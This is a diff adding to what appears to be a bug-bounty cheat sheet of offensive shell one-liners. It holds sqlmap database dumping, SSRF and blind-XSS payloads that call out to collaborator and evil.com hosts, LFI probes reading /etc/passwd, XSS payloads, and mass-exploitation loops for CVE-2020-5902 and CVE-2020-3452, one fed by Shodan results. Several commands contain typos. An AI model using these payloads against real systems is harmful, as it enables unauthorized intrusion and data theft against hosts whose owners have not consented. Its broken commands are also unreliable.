 
  SQL Injectjon for Contact/Registration Forms .
 1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
@@ -2349,6 +2708,13 @@ cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -
 3. select the parameter you want to test
  
  '"<svg/onload=prompt(5);>{{7*7}}
+ 
+ 
+ SQL Injectjon for Contact/Registration Forms .
+
+1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
+2. it will crawl all the links having input field
+3. select the parameter you want to test
  
  
  NUCLEI
@@ -2361,6 +2727,24 @@ nuclei -l urls.txt -t nuclei-templates -tags cve
 
  cent update -p cent-nuclei-templates -f                or    cent update -p cent-nuclei-templates -f
  cent -p cent-nuclei-templates               or                cent -p cent-nuclei-templates  
+ 
+ 
+ Running Nuclei :-
+Scanning target domain with community-curated nuclei templates :-
+
+nuclei -u https://example.com
+
+nuclei -list urls.txt -t /fuzzing-templates
+
+nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
+
+nuclei -u https://example.com -w workflows/
+
+Open Redirect:-
+Open Redirection OneLiner :-
+
+waybackurls tesorion.nl | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+httpx -l i.txt -path "///evil.com" -status-code -mc 302
  
 
 HTTPX scanning a guide
@@ -2402,6 +2786,8 @@ subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:
 fuff scaning " a detailed guide"
 simple attack
 ffuf -u http://testphp.vulnweb.com/FUZZ/ -w dict.txt
+     content discovery
+ffuf -u http://localehost/FUZZ -w user/share/seclists/Diiscovery/web-content/common.txt
 
 
 with burpsuite request 
@@ -2835,6 +3221,7 @@ nuclei -t templates/subdomain-takeover.yaml -1 subdomains.txt
    chaos -d example.com | gospider -s https://example.com | findomain -t example.com | assetfinder | amass intel -d example.com | hpptx -silent -thread 10 -status code 200 | anew | sort -u 
    
    
+    ONELINER-SCRIPT-FOR-BUG-BOUNTY                  ONELINER-SCRIPT-FOR-BUG-BOUNTY                ONELINER-SCRIPT-FOR-BUG-BOUNTY
    
    
    onliner search for xss using kxss, xargs and httpx
@@ -2873,20 +3260,221 @@ nuclei -t templates/subdomain-takeover.yaml -1 subdomains.txt
    
    
    
+   Blind SSRF Oneliner:
+cat wayback.txt|gf ssrf |qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
+
+cat wayback.txt|gf ssrf |grep -a -i \=http|qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
+
+    
+    Blind SSRF Oneliner(X-Forwarded-Host):
+echo "testphp.vulnweb.com"|assetfinder|httprobe|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
+
+echo "testphp.vulnweb.com"|assetfinder|httpx|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
+
+  Open Redirect Oneliner:
+cat waybackurls_result.txt|grep -a -i \=http|qsreplace 'http://evil.com'|while read host do;do curl -s -L $host -I|grep "evil.com" && echo "$host \033[0;31m[+]VULNERABLE-TO-OPEN-REDIRECT-ATTACK\n";done
+  
+ 
+ Blind XSS Oneliner:
+echo testphp.vulnweb.com|gau -subs|grep "https://" |grep -v "png\|jpg\|css\|js\|gif\|txt"|grep "="|uro|dalfox pipe --deep-domxss --multicast --blind akshayravi0479.xss.ht
+
+
+Content Discovery With Dirsearch Oneliner:
+dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -u http://target
+
+ SQLI Oneliner With Sqlmap:
+1 subfinder -d target.com|tee -a domains.txt
+2 cat domains.txt|httpx|tee -a urls-alive.txt
+3 cat urls-alive.txt|waybackurls|tee -a urls-check.txt
+4 gf sqli urls-check.txt >> sql.url
+5 sqlmap -m sql.url --dbs --batch
+
+  
+  Open Redirect:
+https://target[.]com///google[.]com/  --> 404 Not found
+https://target[.]com///google[.]com/?qwerty  --> Redirects to google[.]com
+
+
+XSS Scanner
+echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+
+gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
+
+waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
+
+cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
+
+XSS Payloads:
+xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
+"/><details/open/ontoggle=promt(1)>
+
+"onfocus="alert(1)"autofocus="abc
+
+     LOCAL FILL INCLUSION
+   gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+   
+   Open-redirect
+   export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
+   cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
+   
+   
+   Prototype Pollution
+   subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
+   
+   CVE-2020-5902    CVE-2020-5902       CVE-2020-5902
+   shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
+   
+   
+   CVE-2020-3452       CVE-2020-3452      CVE-2020-3452
+   while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
+   
+   CVE-2022-0378    CVE-2022-0378    CVE-2022-0378
+   
+   cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
+   
+   
+   
+   FIND JAVASCRIPT FILES     FIND JAVASCRIPT FILES    FIND JAVASCRIPT FILES
+   
+   assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
+   
+   EXTRACT ENDPOINTS FROM JAVASCRIPT   
+   cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
+
+   
+   
+   Subdomain Bruteforcer with FFUF
+   ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
+   
+   Extract IPs from a File
+   grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
+   
+   Create Custom Wordlists
+   gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt
+   
+   cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  
+   
+   
+    Extracts Juicy Informations  Extracts Juicy Informations    Extracts Juicy Informations
+    for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done
+    
+    Find Subdomains TakeOver
+    subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
+    
+    
+    Dump Custom URLs from ParamSpider
+    
+    cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
+    
+    
+    EXTRACT ENDPOINTS FROM SWAGGER.JSON
+    curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
+    
+    
+    CORS Misconfiguration
+    site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
+    
+    
+    Find Hidden Servers and/or Admin Panels
+    
+    ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
+    
+    
+    COMMAND THAT (TO BE EXECUTED ONCE A MONTH -MORE OR LESS
+    
+    today=$(date '+%Y-%m-%d'); cat subdomains.txt | httpx -follow-redirects -json -silent | tee active_subdomains_$today.json | jq -r '[.url,.content_length,.title,.host,.status_code] | @csv' | tee urls_modified_raw_$today.csv | anew -d urls_modified_raw_old.csv | cut -d',' -f1 | sed 's/"//g' | ./program active_subdomains_clean_$today.csv active_subdomains_clean_old.csv | tee urls_modified_clean_$today.txt | nuclei -silent -exclude-severity info,low | tee nuclei_urls_modified_$today.txt | notify; cp urls_modified_raw_{$today,old}.csv
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
    
    
    
    
    
 
+
+
+
+
+    
+    
+  
    
-   
-   
-   
-   
-   
-   
-   
+  
    
    
    
